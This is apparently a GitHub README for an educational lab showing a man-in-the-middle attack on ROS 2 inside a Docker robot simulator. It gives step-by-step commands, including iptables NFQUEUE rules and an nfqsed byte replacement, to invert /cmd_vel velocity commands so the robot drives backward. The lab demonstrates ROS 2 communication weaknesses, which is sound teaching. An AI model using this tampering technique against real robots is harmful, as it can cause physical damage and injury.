# ROS2_Attack_Demo_Educational

Table of Contents
=================
  * [Description](#description)
  * [Requeriments](#requeriments)
  * [Instructions](#instructions)
  * [Documentation and Resource links](#documentation_and_resource_links)


  
## Description 
This repository contains a step-by-step guide to perform a MITM attack in ROS 2, for educational purposes. This guide makes use of the MERLIN2_docker platform, which consists of a docker image with a simulator for the RB1 robot.

The purpose of this guide is to present the vulnerabilities present in the communication mechanisms used by the ROS 2 framework.

## Requeriments

First of all, the following software is required to perform the experiment:

 - A installation of `Docker`
 - A local `ROS 2` distribution installed (Humble is recommended)
 - The package `ros-<DISTRO>-teleop-twist-keyboard`
 - A installation of `Wireshark`
 - `nfqsed` tool [https://github.com/rgerganov/nfqsed]
 - Docker image that contain the platform used for the experiment: [`MERLIN2_docker`](#https://github.com/MERLIN2-ARCH/merlin2_docker)
 - Installation of `Gazebo`
 - Installation of Rviz2
 - Installation of Rocker [https://github.com/osrf/rocker]

## Instructions

1. Execute the docker image with Rocker

    ```
    sudo rocker --nvidia --x11 --privilege mgons/merlin2:humble /bin/bash
    ```

2. Inside the docker run the simulator. This will open a local window for Gazebo and Rviz2.
    ```
    ros2 launch rb1_sandbox small_house.launch.py
    ```
    
    ![Gazebo Image](/images/Gazebo.png "Example of Gazebo execution with Rocker")
    ![RVIZ2 Image](/images/RVIZ2.png "Example of RVIZ2 execution with Rocker")
    
    
3. Run teleop node locally
    ```
    ros2 run teleop_twist_keyboard teleop_twist_keyboard
    ```
4. We will focus in the topic which have information about movement: /cmd_vel. With the following command we can see a list of the available topics.
    ```shell
    $ ros2 topic list
    ```
    ```shell
    /amcl/transition_event
    /amcl_pose
    /behavior_server/transition_event
    /behavior_tree_log
    /bond
    /bt_navigator/transition_event
    /camera/camera_info
    /camera/depth/camera_info
    /camera/depth/image_raw
    /camera/image_raw
    /camera/points
    /clicked_point
    /clock
    /cmd_vel
    /controller_server/transition_event
    ...
    ```
    
    We can see relevant information about the topic with `ros2 topic info <<topic_name>>>`. In this way, we can identify the message type that is been used by the topic. In that case that message type is: `geometry_msgs/msg/Twist`
    
    ```shell
    $ ros2 topic info /cmd_vel -v
    ```
    ```shell
    Type: geometry_msgs/msg/Twist
    Publisher count: 6
    Node name: teleop_twist_keyboard
    Node namespace: /
    Topic type: geometry_msgs/msg/Twist
    Endpoint type: PUBLISHER
    GID: 01.0f.68.a6.11.21.2c.5f
    .01.00.00.00.00.00.11.03.00.00.00.00.00.00.00.00
    QoS profile:
        Reliability: RELIABLE
        History (Depth): UNKNOWN
        Durability: VOLATILE
        Lifespan: Infinite
        Deadline: Infinite
        Liveliness: AUTOMATIC
        Liveliness lease duration: Infinite
    ```
    
    We also can show the structure of the message type:
    
    ```shell
    $ ros2 interface show geometry_msgs/msg/Twist
    ```
    ```shell
    Vector3 linear
    float64 x
    float64 y
    float64 z
    Vector3 angular
    float64 x
    float64 y
    float64 z
    ```
    
5. Teleop node will publish message in /cmd_vel topic. In that case, the node will publish a 0.5 value in X coordinate (of linear velocity) when the user press 'I' key.

    ```shell
    $ ros2 topic echo /cmd_vel
    ```
    ```shell
    linear:
    x: 0.5
    y: 0.0
    z: 0.0
    angular:
    x: 0.0
    y: 0.0
    z: 0.0
    ```
    
6. We must identify the Docker IP. In our case, the teleop node will be publishing in 172.17.0.1 while robot simulation has 172.17.0.2.

    ```shell
    $ ifconfig
    ```
    ```shell
    docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>
    mtu 1500
    inet 172.17.0.1 netmask 255.255.0.0
    broadcast 172.17.255.255
    inet6 fe80::42:14ff:fe51:3357 prefixlen 64
    scopeid 0x20<link>
    ether 02:42:14:51:33:57 txqueuelen 0 (
    Ethernet)
    RX packets 70409 bytes 17665691 (17.6 MB)
    RX errors 0 dropped 0 overruns 0 frame 0
    TX packets 11494 bytes 5410634 (5.4 MB)
    TX errors 0 dropped 0 overruns 0 carrier 0
    collisions 0
    ```
    
7. Run Wireshark (with root) and search for the ros2 packages. The teleop node can be used to generate traffic. We can use the next rule to filter the traffic: ```udp && ip.src==172.17.0.1 && ip.dst==172.17.0.2```. Once we have located a package we must search for the ports and replace them in the scriptDemo.sh file:

![Wireshark Image](/images/Wireshark.png "Example of ROS2 packages in Wireshark")

![Ports Image](/images/ports.png "Ports in Wireshark")

    
    ```shell
    $ sudo iptables -A INPUT -p udp --sport <<port_number>> -j NFQUEUE --queue-num 0
    $ sudo iptables -A OUTPUT -p udp --dport <<port_number>> -j NFQUEUE --queue-num 0
    ```
    
The script is modifying the package replacing the hexadecimal value of x coordinate (of linear velocity). The original value is 0xE03F (0.5 in decimal) and nfqsed will replace that value for 0xE0BF (-0.5 in decimal).

8. Next step consist in run the script and use teleop node to move the robot forward ("I" key), with nfqsed runing, the robot should moving backward when we press "I" key. With Wireshark we can monitor the traffic and see the modification of the package.

    ```shell
    $ ./scriptDemo.sh
    ```
    ```shell
    Rules (in hex):
    e03f -> e0bf
    opening library handle
    unbinding existing nf_queue handler for AF_INET (if any)
    binding nfnetlink_queue as nf_queue handler for AF_INET
    binding this socket to queue ’0’
    setting copy_packet mode
    packet received
    packet received
    rule match, changing payload: e03f -> e0bf
    packet received
    ```
    
    Remember that our script for run nfqsed need no be located inside the nfqsed folder, otherwise you will have to modify the script with the path to nfqsed.
    
    ![OriginalPackage Image](/images/paquete.png "Package before modification.")
    ![HackedPackage Image](/images/RVIZ2.png "Package after modification.")

## Documentation and Resource links

Some useful links:

- Rocker Github: https://github.com/osrf/rocker
- nfqsed Github: https://github.com/rgerganov/nfqsed
- MERLIN2_docker Github: https://github.com/MERLIN2-ARCH/merlin2_docker
- MERLIN2_docker DockerHub: https://hub.docker.com/r/mgons/merlin2

Documentation:
- Paper:
- Demostration video: 
